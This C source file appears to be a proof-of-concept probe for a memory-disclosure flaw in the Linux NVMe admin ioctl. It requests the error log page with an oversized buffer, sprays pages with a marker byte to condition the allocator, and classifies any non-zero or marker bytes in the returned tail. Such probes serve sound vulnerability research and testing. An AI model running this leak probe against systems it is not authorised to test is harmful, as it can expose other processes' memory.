#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/nvme_ioctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ERROR_LOG_LID 0x01U
#define ERROR_LOG_BYTES 8192U
#define SPRAY_BYTES (64U * 1024U * 1024U)
#define MARKER 0xa5U

static void spray_reclaimable_pages(void)
{
	void *p = mmap(NULL, SPRAY_BYTES, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (p == MAP_FAILED) {
		fprintf(stderr, "allocator spray mmap failed: %s\n",
			strerror(errno));
		return;
	}

	memset(p, MARKER, SPRAY_BYTES);
	if (madvise(p, SPRAY_BYTES, MADV_DONTNEED) < 0)
		fprintf(stderr, "allocator spray madvise failed: %s\n",
			strerror(errno));
	munmap(p, SPRAY_BYTES);
}

static int run_one(int fd, size_t data_len)
{
	struct nvme_admin_cmd cmd = { 0 };
	unsigned char *buf = NULL;
	uint32_t numd;
	size_t i, tail_len, nonzero = 0, marker_count = 0;
	size_t marker_run = 0, max_marker_run = 0;
	unsigned char seen[256] = { 0 };
	unsigned int unique = 0;
	int rc;

	if (data_len < ERROR_LOG_BYTES || (data_len & 3U)) {
		fprintf(stderr, "invalid data length: %zu\n", data_len);
		return -1;
	}
	if (data_len / 4U - 1U > UINT32_MAX) {
		fprintf(stderr, "NUMD overflow: %zu\n", data_len);
		return -1;
	}

	if (posix_memalign((void **)&buf, 4096, data_len) != 0) {
		fprintf(stderr, "posix_memalign failed for %zu bytes\n", data_len);
		return -1;
	}
	memset(buf, 0xcc, data_len);

	/*
	 * Best-effort allocator conditioning with a harmless known marker.
	 * This does not guarantee that the target allocator reuses these pages.
	 */
	if (data_len > ERROR_LOG_BYTES &&
	    !getenv("NVME_TAIL_SKIP_USER_SPRAY"))
		spray_reclaimable_pages();

	numd = (uint32_t)(data_len / 4U - 1U);
	cmd.opcode = 0x02; /* NVME_ADMIN_GET_LOG_PAGE */
	cmd.addr = (uint64_t)(uintptr_t)buf;
	cmd.data_len = (uint32_t)data_len;
	cmd.cdw10 = ((numd & 0xffffU) << 16) | ERROR_LOG_LID;
	cmd.cdw11 = (numd >> 16) & 0xffffU;

	errno = 0;
	rc = ioctl(fd, NVME_IOCTL_ADMIN_CMD, &cmd);
	if (rc < 0) {
		fprintf(stderr,
			"RESULT len=%zu ioctl=error errno=%d (%s)\n",
			data_len, errno, strerror(errno));
		free(buf);
		return 1;
	}
	if (rc != 0) {
		printf("RESULT len=%zu ioctl_status=%d result=0x%08x "
		       "classification=REQUEST_REJECTED\n",
		       data_len, rc, cmd.result);
		free(buf);
		return 2;
	}

	tail_len = data_len - ERROR_LOG_BYTES;
	for (i = ERROR_LOG_BYTES; i < data_len; i++) {
		unsigned char v = buf[i];

		if (v)
			nonzero++;
		if (!seen[v]) {
			seen[v] = 1;
			unique++;
		}
		if (v == MARKER) {
			marker_count++;
			marker_run++;
			if (marker_run > max_marker_run)
				max_marker_run = marker_run;
		} else {
			marker_run = 0;
		}
	}

	if (!tail_len) {
		printf("RESULT len=%zu ioctl=success tail=none\n", data_len);
	} else {
		const char *classification;

		if (max_marker_run >= 64)
			classification = "TEST_MARKER_REAPPEARED";
		else if (nonzero)
			classification = "NONZERO_TAIL_OBSERVED";
		else
			classification = "ZERO_TAIL_INCONCLUSIVE";

		printf("RESULT len=%zu ioctl=success tail_bytes=%zu "
		       "nonzero=%zu marker_a5=%zu max_marker_run=%zu "
		       "unique_byte_values=%u classification=%s\n",
		       data_len, tail_len, nonzero, marker_count,
		       max_marker_run, unique, classification);
	}

	free(buf);
	return 0;
}

int main(int argc, char **argv)
{
	int fd, overall = 0, i;

	if (argc < 3) {
		fprintf(stderr, "usage: %s /dev/nvmeX 8192 [16384 ...]\n",
			argv[0]);
		return 64;
	}

	fd = open(argv[1], O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		fprintf(stderr, "cannot open %s: %s\n", argv[1],
			strerror(errno));
		return 1;
	}

	for (i = 2; i < argc; i++) {
		char *end = NULL;
		unsigned long long parsed;
		int rc;

		errno = 0;
		parsed = strtoull(argv[i], &end, 10);
		if (errno || !end || *end || parsed > UINT32_MAX) {
			fprintf(stderr, "invalid length: %s\n", argv[i]);
			overall = 1;
			continue;
		}

		rc = run_one(fd, (size_t)parsed);
		if (rc == 1 || rc < 0 || (i == 2 && rc != 0))
			overall = 1;
	}

	close(fd);
	return overall;
}
